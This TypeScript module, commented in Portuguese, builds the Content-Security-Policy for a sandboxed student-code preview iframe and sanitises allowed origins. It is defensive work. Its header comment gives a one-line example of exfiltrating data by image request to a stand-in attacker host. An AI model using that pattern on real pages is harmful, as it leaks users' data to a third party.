/**
 * Content-Security-Policy INTERNA do srcdoc do preview — defesa em profundidade,
 * ORTOGONAL ao sandbox do iframe (que continua a barreira primária: null-origin,
 * sem `allow-same-origin`).
 *
 * Filosofia (ambiente de aprendizado): liberar subrecursos PASSIVOS de https
 * (imagens, fontes, mídia, CSS, embeds) — comuns em páginas de aluno e de baixo
 * risco — mas TRAVAR os vetores de exfiltração/supply-chain:
 * - `script-src` NÃO inclui `https:` → nada de `<script src=remoto>`.
 * - `connect-src` default `'none'` → sem `fetch`/XHR/WebSocket, a menos que o
 *   professor libere origens (`fetchAllowedOrigins`); reforçado pelo
 *   permissionGuard em runtime (defesa dupla).
 *
 * `script-src 'unsafe-inline'` é inevitável: o srcdoc é montado por scripts
 * inline + importmap com data: URLs. Não há nonce real sem reescrever o
 * pipeline — por isso a CSP reduz REDE/SCRIPTS REMOTOS, e o sandbox segue como
 * barreira principal.
 *
 * ⚠️ CANAL RESIDUAL DE EXFILTRAÇÃO (GET de mão única, ACEITO por design): como
 * `img-src`/`media-src`/`font-src`/`frame-src` liberam `https:` (subrecursos
 * passivos comuns na página do aluno) enquanto `connect-src` é `'none'`, sobra
 * um caminho passivo de exfil por GET — p.ex. `new Image().src =
 * 'https://atacante/?' + dado`. Não há resposta legível (sem fetch/XHR), então é
 * VAZAMENTO de mão única, não um canal bidirecional; e o iframe null-origin não
 * tem cookies/origem nossa para roubar. Trade-off do ambiente de aprendizado:
 * imagens/fontes/mídia remotas valem mais que fechar esse vetor. Um host que
 * precise blindar isso pediria um opt-in para zerar img/media/font/frame-src
 * (ver backlog em docs/embedding.md). NÃO alterar o comportamento da CSP aqui.
 */

export interface PreviewCSPOptions {
  /** Origens https/http que o aluno pode acessar via fetch/XHR (opt-in do host). */
  fetchAllowedOrigins?: readonly string[]
  /**
   * Origens liberadas em `script-src` para módulos ESM de extensão (ex.: o CDN
   * pinado do Three.js). Carregamento de lib de mão única — NÃO é vetor de exfil.
   */
  scriptAllowedOrigins?: readonly string[]
}

// Aceita só origens bem-formadas (esquema + host + porta opcional), sem path,
// query ou caracteres que permitiriam injeção de diretiva na string da CSP.
const ORIGIN_RE = /^https?:\/\/[a-z0-9.-]+(?::\d+)?$/i

export function sanitizeFetchOrigins(origins: readonly string[] | undefined): string[] {
  if (!origins) return []
  const out: string[] = []
  for (const origin of origins) {
    if (typeof origin !== 'string') continue
    const trimmed = origin.trim()
    if (ORIGIN_RE.test(trimmed) && !out.includes(trimmed)) out.push(trimmed)
  }
  return out
}

export function buildPreviewCSP(options: PreviewCSPOptions = {}): string {
  const origins = sanitizeFetchOrigins(options.fetchAllowedOrigins)
  const connectSrc = origins.length > 0 ? origins.join(' ') : "'none'"
  const scriptOrigins = sanitizeFetchOrigins(options.scriptAllowedOrigins)
  const scriptSrc = ["'unsafe-inline'", 'data:', 'blob:', ...scriptOrigins].join(' ')
  return [
    "default-src 'none'",
    `script-src ${scriptSrc}`,
    "style-src 'unsafe-inline' https:",
    'img-src data: blob: https:',
    'media-src data: blob: https:',
    'font-src data: https:',
    `connect-src ${connectSrc}`,
    'frame-src https: data: blob:',
    "base-uri 'none'",
    "form-action 'none'",
  ].join('; ')
}

export function buildPreviewCSPMetaTag(options: PreviewCSPOptions = {}): string {
  const content = buildPreviewCSP(options).replace(/"/g, '&quot;')
  return `<meta http-equiv="Content-Security-Policy" content="${content}">`
}
